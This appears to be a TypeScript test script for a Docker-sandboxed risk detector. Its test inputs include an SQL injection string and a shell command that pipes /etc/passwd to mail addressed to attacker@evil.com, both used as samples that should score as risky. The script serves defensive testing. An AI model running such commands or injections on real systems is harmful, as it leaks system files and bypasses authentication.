
import { ExecutionIsolationService } from '../src/services/execution-isolation.js';

async function main() {
    console.log('🚀 Starting Execution Isolation Verification...');

    // Instantiate Service
    const svc = new ExecutionIsolationService();

    // Test Data
    const payloads = [
        { text: "SELECT * FROM users WHERE id = '1' OR '1'='1'", expectedHighRisk: true },
        { text: "cat /etc/passwd | mail attacker@evil.com", expectedHighRisk: true },
        { text: "Hello World, this is a distinct pattern.", expectedHighRisk: false }
    ];

    console.log(`\n[Info] Testing ${payloads.length} payloads inside Docker sandbox (python:3.9-alpine)...`);

    for (const test of payloads) {
        console.log(`\n--- Testing: ${test.text} ---`);

        try {
            // Actual Docker Call
            const result = await svc.executePythonScript('analyze_pattern.py', { text: test.text });

            if (result.success) {
                console.log('✅ Execution Success');
                console.log('   Time:', result.executionTimeMs, 'ms');
                console.log('   Output:', result.output);

                const risk = result.output?.risk_score || 0;
                const matches = result.output?.matches || [];

                if (test.expectedHighRisk) {
                    if (risk > 0.3) console.log(`   Result: Correctly identified as RISKY (Score: ${risk})`);
                    else console.error(`   ❌ FAILED: Should be risky but got score ${risk}`);
                } else {
                    if (risk < 0.3) console.log(`   Result: Correctly identified as SAFE (Score: ${risk})`);
                    else console.error(`   ❌ FAILED: Should be safe but got score ${risk}`);
                }

            } else {
                console.error('❌ Execution Failed:', result.error);
                // Docker might fail if image missing or pipe issues.
                // We want to see the error detail.
            }
        } catch (err: any) {
            console.error('❌ Test Script Error:', err.message);
        }
    }
}

main().catch(console.error);
